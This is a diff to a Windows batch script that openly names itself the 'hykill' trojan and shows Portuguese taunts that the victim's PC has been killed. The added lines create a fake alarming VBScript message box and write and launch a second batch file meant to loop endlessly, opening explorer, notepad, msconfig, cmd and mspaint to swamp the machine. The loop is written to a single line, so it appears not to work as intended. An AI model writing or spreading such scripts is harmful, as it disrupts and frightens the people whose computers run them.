@@ -1,6 +1,10 @@
 @echo off
 echo "Seu PC foi morto pelo virus hykill." > hahahahahahahahahahahah.txt
 Start hahahahahahahahahahahah.txt
+echo "MsgBox Hykill matou seu pc",16,"ahahahhahahahhahahahah" > hahahahahahahhahah.vbs 
+echo "MsgBox Hykill matou seu pc",16,"ahahahhahahahhahahahah" > hahahahahahahhahah.vbs 
+echo :loop start explorer start hahahahahahahhahah.vbs start notepad start msconfig start cmd start mspaint goto loop > hahahahahahahhahah.bat 
+start hahahahahahahhahah.bat
 Md AHAHAHAHAHHAHAHAH
 Md trojan Hykill
 md hahahaha
